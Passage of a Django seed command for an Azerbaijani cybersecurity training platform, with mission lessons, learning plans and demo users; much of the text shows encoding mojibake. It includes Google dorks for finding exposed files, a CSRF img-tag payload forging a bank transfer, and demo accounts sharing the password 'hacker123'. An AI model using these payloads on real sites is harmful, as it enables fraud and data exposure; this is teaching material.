             "content": "<h2>Encoding vs Encryption</h2><p>Base64 şifrəlÉ™mÉ™ DEYİL — sadÉ™cÉ™ encoding-dir. Hər kÉ™s deÅŸifrÉ™ edÉ™ bilÉ™r.</p><pre><code>echo 'flag' | base64\necho 'ZmxhZwo=' | base64 -d</code></pre>"},
        ],
        "exam": None,
    },
    {
        "slug": "osint-recon",
        "title": "OSINT KÉ™ÅŸfiyyat",
        "difficulty": "easy",
        "icon": "ðŸ"Ž",
        "color": "#f59e0b",
        "xp": 350,
        "hours": 1,
        "short_desc": "Passiv mÉ™lumat toplama vÉ™ hÉ™dÉ™f profili qurmaq.",
        "desc": "OSINT texnikaları: whois, DNS, Google dorks, LinkedIn, crt.sh vÉ™ Shodan ilÉ™ hÉ™dÉ™f haqqında tam profil qurmaq.",
        "passes": [
            {"title": "Passive Recon Alətləri", "order": 1, "minutes": 20,
             "content": "<h2>Passive Recon</h2><ul><li>whois — domain qeydiyyatı</li><li>dig/nslookup — DNS sorÄŸuları</li><li>crt.sh — sertifikat şÉ™ffaflıq logları</li><li>Shodan — internet-baÄŸlı cihazlar</li></ul>"},
            {"title": "Google Dorks", "order": 2, "minutes": 15,
             "content": "<h2>Google Dork OperatorlÉ™ri</h2><pre><code>site:example.com\nfiletype:pdf confidential\ninurl:admin\nintitle:index.of\n</code></pre>"},
        ],
        "exam": None,
    },
    {
        "slug": "burp-suite-pro",
        "title": "Burp Suite Pro",
        "difficulty": "medium",
        "icon": "ðŸŽ¯",
        "color": "#ff7a8a",
        "xp": 900,
        "hours": 3,
        "short_desc": "Proxy, Repeater, Intruder vÉ™ Scanner ilÉ™ professional web pentest.",
        "desc": "Burp Suite CE vÉ™ Professional fÉ™rqin öyrÉ™n, proxy-É™ intercept qur, Repeater ilÉ™ manuAl test et, Intruder ilÉ™ fuzzing et.",
        "passes": [
            {"title": "Proxy qurulumu", "order": 1, "minutes": 15,
             "content": "<h2>Burp Proxy</h2><p>Brauzer → Burp → HÉ™dÉ™f. Intercept On/Off. Sertifikat yükləmÉ™k.</p>"},
            {"title": "Repeater vÉ™ İntruder", "order": 2, "minutes": 25,
             "content": "<h2>Repeater</h2><p>Sorğuları tÉ™krarla vÉ™ dÉ™yiÅŸ. Intruder ilÉ™ parametrÉ™ wordlist göndÉ™r.</p>"},
        ],
        "exam": None,
    },
    {
        "slug": "csrf-attack-defense",
        "title": "CSRF HÃ¼cum vÉ™ MüdafiÉ™",
        "difficulty": "medium",
        "icon": "ðŸ"",
        "color": "#6b7280",
        "xp": 550,
        "hours": 2,
        "short_desc": "CSRF token bypass vÉ™ SameSite cookie qorunması.",
        "desc": "CSRF hücumlarının mexanizmi, token-based mÃ¼dafiÉ™ vÉ™ SameSite cookie atributlarının tÉ™dqiqi.",
        "passes": [
            {"title": "CSRF Mexanizmi", "order": 1, "minutes": 20,
             "content": "<h2>CSRF NecÉ™ İşləyir?</h2><p>BÉ™dniiyyÉ™tli sayt, istifadÉ™Ã§inin brauzerindÉ™ki cookie-dÉ™n istifadÉ™ edÉ™rÉ™k hÉ™dÉ™f sayta sorÄŸu göndÉ™rir.</p><pre><code>&lt;img src=\"https://bank.com/transfer?amount=1000&to=attacker\"&gt;</code></pre>"},
        ],
        "exam": None,
    },
]

# ─── LearningPlan məlumatları ───────────────────────────────────

PLANS_DATA = [
    {
        "slug": "bug-bounty-hunter",
        "title": "Bug Bounty Hunter",
        "summary": "Web zÉ™ifliklÉ™rini tapmaq üçün tam marşrut. SQL injection-dan XSS-É™ qÉˆdÉˆr.",
        "description": "Bu öyrÉ™nmÉ™ yolu sizi Bug Bounty proqramlarında iÅŸtirak etmÉ™yÉ™ hazırlayır. Éˆsas web zÉ™ifliklÉ™ri, Burp Suite istifadÉ™si vÉ™ real lab tÉ™crÃ¼bÉ™si.",
        "level": "intermediate", "hours": 30, "icon": "ðŸŽ¯", "featured": True,
        "course_slugs": ["web-security-fundamentals", "advanced-pentesting"],
    },
    {
        "slug": "penetration-tester",
        "title": "Penetration Tester",
        "summary": "Sıfırdan professional pentester-É™. Network, web, system.",
        "description": "TamÅŸamilli pentest marÅŸrutu: ÅŸÉ™bÉ™kÉ™ kÉ™ÅŸfindÉ™n exploitation vÉ™ post-exploit-É™ qÉˆdÉˆr.",
        "level": "advanced", "hours": 60, "icon": "ðŸ"¨", "featured": True,
        "course_slugs": ["network-security-101", "linux-privilege-escalation", "advanced-pentesting"],
    },
    {
        "slug": "crypto-expert",
        "title": "KriptoqrafiyA MütÉ™xÉ™ssisi",
        "summary": "ÅžifrÉ™lÉ™mÉ™, hash, steqanoqrafiya vÉ™ kriptoanaliz.",
        "description": "Klassik vÉ™ müasir kriptoqrafiya üzrÉ™ dÉ™rin bilik. Hash kracking, steganalysis vÉ™ asimmetrik kriptoqrafiya.",
        "level": "intermediate", "hours": 25, "icon": "ðŸ"", "featured": False,
        "course_slugs": ["cryptography-basics"],
    },
    {
        "slug": "osint-specialist",
        "title": "OSINT Mütəxəssisi",
        "summary": "Passiv kÉ™ÅŸfiyyat vÉ™ hÉ™dÉ™f profili qurmaq.",
        "description": "OSINT texnikalarını mÉ™nimsÉ™ vÉ™ real hÉ™dÉ™flÉ™r haqqında tam mÉ™lumat profili qurmağı öyrÉ™n.",
        "level": "beginner", "hours": 15, "icon": "ðŸ"Ž", "featured": False,
        "course_slugs": ["osint-techniques"],
    },
    {
        "slug": "red-team-specialist",
        "title": "Red Team Specialist",
        "summary": "Advanced persistent threat simulyasiyası vÉ™ zero-day kÉ™ÅŸfi.",
        "description": "Red team Ã©mliyyatlarında iÅŸtirak: sosial mÃ¼hÉ™ndislik, exploitation, lateral movement vÉ™ C2.",
        "level": "advanced", "hours": 80, "icon": "ðŸš©", "featured": True,
        "course_slugs": ["advanced-pentesting", "linux-privilege-escalation", "network-security-101"],
    },
]


# ═══════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def ensure_tags():
    result = {}
    for name in TAGS:
        tag, _ = RoomTag.objects.get_or_create(
            slug=name, defaults={"name": name.replace("-", " ").title()}
        )
        result[name] = tag
    return result


def ensure_categories():
    result = {}
    for d in CATEGORIES:
        cat, _ = Category.objects.update_or_create(
            slug=d["slug"],
            defaults={"name": d["name"], "icon": d["icon"], "color": d["color"], "description": d["description"]},
        )
        result[d["slug"]] = cat
    return result


def seed_courses(categories):
    courses_by_slug = {}
    for cd in COURSES_DATA:
        cat = categories.get(cd["category"])
        course, _ = Course.objects.update_or_create(
            slug=cd["slug"],
            defaults={
                "title": cd["title"],
                "description": cd["description"],
                "category": cat,
                "icon": cd["icon"],
                "is_published": True,
            },
        )
        courses_by_slug[cd["slug"]] = course

        # Lessons
        for ld in cd.get("lessons", []):
            Lesson.objects.update_or_create(
                course=course, order=ld["order"],
                defaults={"title": ld["title"], "content": ld["content"]},
            )

        # Self-study Questions
        for i, qd in enumerate(cd.get("questions", []), start=1):
            q, _ = Question.objects.update_or_create(
                course=course, title=qd["title"],
                defaults={
                    "prompt": qd["prompt"],
                    "question_type": qd["type"],
                    "level": qd["level"],
                    "points": qd["points"],
                    "starter_code": qd.get("starter_code", ""),
                    "order": i,
                    "is_published": True,
                },
            )
            q.choices.all().delete()
            for ci, (text, correct) in enumerate(qd.get("choices", []), start=1):
                QuestionChoice.objects.create(question=q, text=text, is_correct=correct, order=ci)

    return courses_by_slug


def seed_rooms(courses_by_slug, tags):
    for rd in ROOMS_DATA:
        course = courses_by_slug.get(rd["course_slug"])
        if not course:
            continue
        room, _ = Room.objects.update_or_create(
            slug=slugify(rd["title"]),
            defaults={
                "course": course,
                "title": rd["title"],
                "summary": rd["summary"],
                "description": rd.get("description", rd["summary"]),
                "level": rd["level"],
                "estimated_minutes": rd["minutes"],
                "points": rd["points"],
                "icon": rd["icon"],
                "cover_color": rd["color"],
                "env": rd.get("env", "docker"),
                "is_published": True,
                "order": 0,
            },
        )
        room.tags.set([tags[t] for t in rd.get("tags", []) if t in tags])

        for ti, td in enumerate(rd.get("tasks", []), start=1):
            task, _ = Task.objects.update_or_create(
                room=room, slug=slugify(td["title"]),
                defaults={"title": td["title"], "content": td["content"], "order": ti, "points": td["points"]},
            )
            task.questions.all().delete()
            for qi, qd in enumerate(td.get("questions", []), start=1):
                kind_map = {"text": TaskAnswerKind.TEXT, "numeric": TaskAnswerKind.NUMERIC, "choice": TaskAnswerKind.CHOICE}
                kind = kind_map.get(qd.get("kind", "text"), TaskAnswerKind.TEXT)
                tq = TaskQuestion.objects.create(
                    task=task, prompt=qd["prompt"], kind=kind,
                    answer=str(qd.get("answer", "")),
                    hint=qd.get("hint", ""), explanation=qd.get("explanation", ""),
                    points=qd.get("points", 15), order=qi,
                )
                for ci, (text, correct) in enumerate(qd.get("choices", []), start=1):
                    TaskQuestionChoice.objects.create(question=tq, text=text, is_correct=correct, order=ci)


def seed_missions():
    diff_map = {
        "easy": MissionDifficultyChoices.EASY,
        "medium": MissionDifficultyChoices.MEDIUM,
        "hard": MissionDifficultyChoices.HARD,
        "expert": MissionDifficultyChoices.EXPERT,
    }
    for i, md in enumerate(MISSIONS_DATA, start=1):
        mission, _ = Mission.objects.update_or_create(
            slug=md["slug"],
            defaults={
                "title": md["title"],
                "description": md["desc"],
                "short_description": md["short_desc"],
                "difficulty": diff_map.get(md["difficulty"], MissionDifficultyChoices.MEDIUM),
                "cover_color": md["color"],
                "icon": md["icon"],
                "estimated_hours": md["hours"],
                "xp_reward": md["xp"],
                "order": i,
                "is_published": True,
            },
        )

        # Passes
        for pd in md.get("passes", []):
            MissionPass.objects.update_or_create(
                mission=mission, order=pd["order"],
                defaults={"title": pd["title"], "content": pd["content"],
                          "estimated_minutes": pd["minutes"], "is_published": True},
            )

        # Exam
        ed = md.get("exam")
        if ed:
            exam, _ = MissionExam.objects.update_or_create(
                mission=mission,
                defaults={
                    "title": ed["title"],
                    "passing_score": ed["passing"],
                    "time_limit_minutes": ed["time"],
                    "max_attempts": ed["max_attempts"],
                    "xp_reward": ed["xp"],
                    "is_published": True,
                },
            )
            exam.questions.all().delete()
            for qd in ed.get("questions", []):
                eq = MissionExamQuestion.objects.create(
                    exam=exam,
                    question_text=qd["text"],
                    question_type=qd["type"],
                    order=qd["order"],
                )
                for ci, (text, correct) in enumerate(qd.get("choices", []), start=1):
                    MissionExamChoice.objects.create(question=eq, choice_text=text, is_correct=correct, order=ci)


def seed_plans(courses_by_slug):
    for pd in PLANS_DATA:
        plan, _ = LearningPlan.objects.update_or_create(
            slug=pd["slug"],
            defaults={
                "title": pd["title"],
                "summary": pd["summary"],
                "description": pd["description"],
                "level": pd["level"],
                "estimated_hours": pd["hours"],
                "icon": pd["icon"],
                "is_featured": pd["featured"],
                "is_published": True,
            },
        )
        LearningPlanCourse.objects.filter(plan=plan).delete()
        for idx, cs in enumerate(pd["course_slugs"], start=1):
            if cs in courses_by_slug:
                LearningPlanCourse.objects.create(plan=plan, course=courses_by_slug[cs], order=idx)


def wipe_content():
    TaskQuestionChoice.objects.all().delete()
    TaskQuestion.objects.all().delete()
    Task.objects.all().delete()
    Room.objects.all().delete()
    RoomTag.objects.all().delete()
    MissionExamChoice.objects.all().delete()
    MissionExamQuestion.objects.all().delete()
    MissionExam.objects.all().delete()
    MissionPass.objects.all().delete()
    Mission.objects.all().delete()
    QuestionChoice.objects.all().delete()
    Question.objects.all().delete()
    Lesson.objects.all().delete()
    LearningPlanCourse.objects.all().delete()
    LearningPlan.objects.all().delete()
    Enrollment.objects.all().delete()
    Course.objects.all().delete()
    Category.objects.all().delete()


def create_demo_users():
    demo = [
        ("narmin", "hacker123", 4200),
        ("elvin", "hacker123", 7800),
        ("samir", "hacker123", 2100),
        ("aysel", "hacker123", 15200),
        ("leyla", "hacker123", 980),
        ("ramin", "hacker123", 520),
    ]
    for username, password, xp in demo:
        user, created = User.objects.get_or_create(
            username=username,
            defaults={"email": f"{username}@demo.xakker.org", "is_staff": False},
        )
        if created:
            user.set_password(password)
            user.save()
        profile, _ = UserProfile.objects.get_or_create(user=user)
        profile.xp = xp
        profile.tasks_completed = max(xp // 40, 1)
        profile.rooms_completed = max(xp // 300, 0)
        profile.streak_days = max(xp // 200, 0)
        profile.recompute_rank()
        profile.save()


# ═══════════════════════════════════════════════════════════════
#  COMMAND
# ═══════════════════════════════════════════════════════════════

class Command(BaseCommand):
    help = "Xakker üçün tam mÉ™lumat seed-i (kurslar, laborlar, missiyalar, suallar, planlar)."

    def add_arguments(self, parser):
        parser.add_argument("--reset", action="store_true", help="Seed-É™ qÉˆdÉˆr bütün kontent mÉ™lumatlarını sil.")
        parser.add_argument("--demo-users", action="store_true", help="Demo istifadÉ™Ã§ilÉ™ri yarat.")

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            self.stdout.write(self.style.WARNING("MÉ™lumatlar silinir..."))
            wipe_content()

        self.stdout.write("Kategoriyalar vÉ™ teqlÉ™r...")
        cats = ensure_categories()
        tags = ensure_tags()

        self.stdout.write("Kurslar, dÉ™rslÉ™r vÉ™ suallar...")
        courses = seed_courses(cats)

        self.stdout.write("Lab otaqları vÉ™ tapşırıqlar...")
        seed_rooms(courses, tags)

        self.stdout.write("Missiyalar...")
        seed_missions()

        self.stdout.write("ÖyrÉ™nmÉ™ yolları...")
        seed_plans(courses)

        if opts.get("demo_users"):
            self.stdout.write("Demo istifadÉ™Ã§ilÉ™r...")
            create_demo_users()

        self.stdout.write(self.style.SUCCESS(
            f"\n✓ Seed tamamlandı:\n"
            f"  {Course.objects.count()} kurs\n"
            f"  {Lesson.objects.count()} dÉ™rs\n"
            f"  {Question.objects.count()} Ã¶yrÉ™nmÉ™ sualı\n"
            f"  {Room.objects.count()} lab otağı\n"
            f"  {Task.objects.count()} task\n"
            f"  {TaskQuestion.objects.count()} task sualı\n"
            f"  {Mission.objects.count()} missiya\n"
            f"  {MissionPass.objects.count()} missiya mÉ™rhÉ™lÉ™si\n"
            f"  {LearningPlan.objects.count()} öyrÉ™nmÉ™ yolu"
        ))
